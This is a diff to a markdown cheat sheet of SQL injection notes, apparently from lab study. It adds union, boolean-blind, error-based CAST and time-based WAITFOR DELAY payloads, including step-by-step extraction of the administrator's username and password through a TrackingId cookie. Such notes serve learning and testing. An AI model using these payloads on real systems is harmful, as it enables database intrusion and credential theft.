@@ -53,7 +53,7 @@ In-Band SQLi - UNION:
 - Examining the database:
     - Querying the database type and version: ' UNION SELECT @@version--
         - Microsoft, MySQL: SELECT @@version
-        - Oracle: SELECT * FROM v$version
+        - Oracle: SELECT banner FROM v$version
         - PostgreSQL: SELECT version()
 - Listing the contents of the database:
     - Query information_schema.tables view to list the tables in the database:
@@ -72,5 +72,32 @@ In-Band SQLi - UNION:
         - With false: ' AND '1'='2
         - Veriry/confirm table user: ' AND (SELECT 'a' FROM users LIMIT 1)='a
         - Confirm user administrator exist in users table/column: ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-        - Determine how many characters are in the password of the administrator user: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
-        - Test different password lengths: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+        - Determine how many characters are in the password of the administrator user and test different password lengths:
+            - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+            - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+            - ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+        - Test the character at each position to determine its value (Intruder): ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
+
+- Blind - Error-based SQLi:
+    - Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger.
+    - Exploiting blind SQL injection by triggering conditional errors:
+        - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+        - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
+    - Extracting sensitive data via verbose SQL error messages:
+        - CAST() function: CAST((SELECT example_column FROM example_table) AS int)
+        - An error-based SQL injection using the TrackingId cookie. Initially, appending a single quote reveals a verbose SQL error confirming the injection point: TrackingId=ogAZZfxtOKUELbuJ'
+        - To fix the broken query, SQL comment characters are added: TrackingId=ogAZZfxtOKUELbuJ'--
+        - Then, a basic payload is tested to confirm injection by using a CAST: TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+        - The error response guides a fix: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+        Next, the payload tries to extract data: TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+        Due to truncation, the cookie value is shortened: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+        - It fails due to multiple rows, so a LIMIT 1 is added: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+        - This leaks the first username: "administrator". The final step retrieves the password: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+- Blind - Time-based SQLi:
+    - When SQL errors are handled gracefully and no error messages are shown, blind SQL injection can be exploited using time-based delays. By injecting conditions that cause deliberate delays (e.g., using SLEEP()), attackers can infer whether a condition is true or false based on the time taken for the HTTP response.
+    - Exploiting blind SQL injection by triggering time delays:
+        - The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server:
+        - The first of these inputs does not trigger a delay, because the condition 1=2 is false: '; IF (1=2) WAITFOR DELAY '0:0:10'--
+        - The second input triggers a delay of 10 seconds, because the condition 1=1 is true: '; IF (1=1) WAITFOR DELAY '0:0:10'--
+        - Retrieve data by testing one character at a time: '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
